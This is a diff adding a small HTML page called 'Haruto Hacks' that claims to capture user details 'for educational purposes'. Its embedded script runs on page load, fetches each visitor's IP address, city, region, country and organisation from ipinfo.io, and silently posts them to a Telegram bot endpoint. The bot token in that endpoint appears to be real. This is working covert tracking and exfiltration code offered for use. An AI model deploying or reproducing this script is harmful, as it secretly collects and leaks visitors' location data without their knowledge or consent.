@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Haruto Hacks</title>
+</head>
+<body>
+    <h1>Welcome to Haruto Hacks!</h1>
+    <p>This site captures user details for educational purposes.</p>
+
+    <script>
+        // Use ipinfo.io to get visitor's IP details
+        fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN')  // Get token from ipinfo.io
+        .then(response => response.json())
+        .then(data => {
+            console.log(data); // For testing purposes
+
+            // Send the user details to your bot webhook
+            const webhookUrl = 'https://api.telegram.org/bot7650154311:AAEXzWOOdwWKU8sT7uJDi1S-dIrjyqR6WHA/sendMessage';
+
+            const message = `New visitor found:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrg: ${data.org}`;
+
+            // Sending the data to the bot webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '',  // You can leave it empty
+                    text: message
+                }),
+            });
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
